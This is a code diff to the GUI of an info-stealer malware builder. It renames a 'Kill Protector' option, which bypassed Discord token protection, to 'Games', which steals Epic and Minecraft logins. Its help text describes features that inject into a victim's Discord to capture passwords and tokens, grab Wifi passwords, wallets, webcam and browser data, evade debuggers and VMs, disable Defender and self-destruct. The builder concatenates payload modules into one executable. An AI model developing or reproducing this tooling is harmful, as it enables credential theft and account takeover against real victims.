@@ -51,7 +51,6 @@ class App(ctk.CTk):
             "injection": False,
             "minecraft": False,
             "wifi": False,
-            "killprotector": False,
             "antidebug_vm": False,
             "discord": False,
             "anti_spam": False,
@@ -139,10 +138,10 @@ class App(ctk.CTk):
             fg_color="#5d11c3", hover_color="#5057eb")
         self.defender.grid(row=1, column=0, sticky="nw", padx=286, pady=60)
 
-        self.killprotector = ctk.CTkCheckBox(
-            self.builder_frame, text="Kill Protector", font=ctk.CTkFont(size=17, family=self.font),
+        self.games = ctk.CTkCheckBox(
+            self.builder_frame, text="Games", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.killprotector.grid(row=1, column=0, sticky="nw", padx=286, pady=105)
+        self.games.grid(row=1, column=0, sticky="nw", padx=286, pady=105)
 
         self.antidebug_vm = ctk.CTkCheckBox(
             self.builder_frame, text="Anti Debug/Vm", font=ctk.CTkFont(size=17, family=self.font),
@@ -242,7 +241,7 @@ class App(ctk.CTk):
         self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=420)
         
         self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.backupcodes, self.browser, self.webcam,
-                           self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.killprotector, self.antidebug_vm, self.discord, self.clipboard,
+                           self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.games, self.antidebug_vm, self.discord, self.clipboard,
                            self.antispam, self.self_destruct, self.pump, self.wallets]
 
         # Frame 2
@@ -271,7 +270,7 @@ Obfuscation:\nThis will obfuscate the file which means the source code will be u
 Injection:\nThis will inject a script into your victim's discord which means when they change any credentials you will recieve their \npassword and token to that discord account.\n\n
 Minecraft Info:\nThis will get the user's minecraft information such as their session info and user cache.\n\n
 Wifi Info:\nThis will get the user's wifi information such as wifi passwords and wifi networks.\n\n
-Kill Protector:\nThis will kill a discord protector that some people use so their token can't be taken but this bypasses that.\n\n
+Games:\nThis will currently steal Epic and minecraft logins.\n\n
 Anti-Debug VM:\nThis will check if the user is using a virtual machine or if they are debugging this script and it will exit out to stop them.\n\n
 Discord Info:\nThis will send you all the discord information for every account they have. This info consists of their email, phone number, if \nthey have 2fa enabled, if they have nitro and what type of nitro, token and any gift cards.\n\n
 Anti Spam:\nOnly allows the victim to open the file every 60 seconds so your webhook isnt rate limited or spammed.\n\n
@@ -410,7 +409,6 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
             "injection": self.injection,
             "minecraft": self.minecraft,
             "wifi": self.wifi,
-            "killprotector": self.killprotector,
             "antidebug_vm": self.antidebug_vm,
             "discord": self.discord,
             "anti_spam": self.antispam,
@@ -525,11 +523,6 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 
                 if self.updated_dictionary["injection"]:
                     with open(options+"Injection.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["killprotector"]:
-                    with open(options+"Kill_protector.py", "r", encoding="utf-8") as f:
                         code += f.read()
                         code += "\n\n"
                 
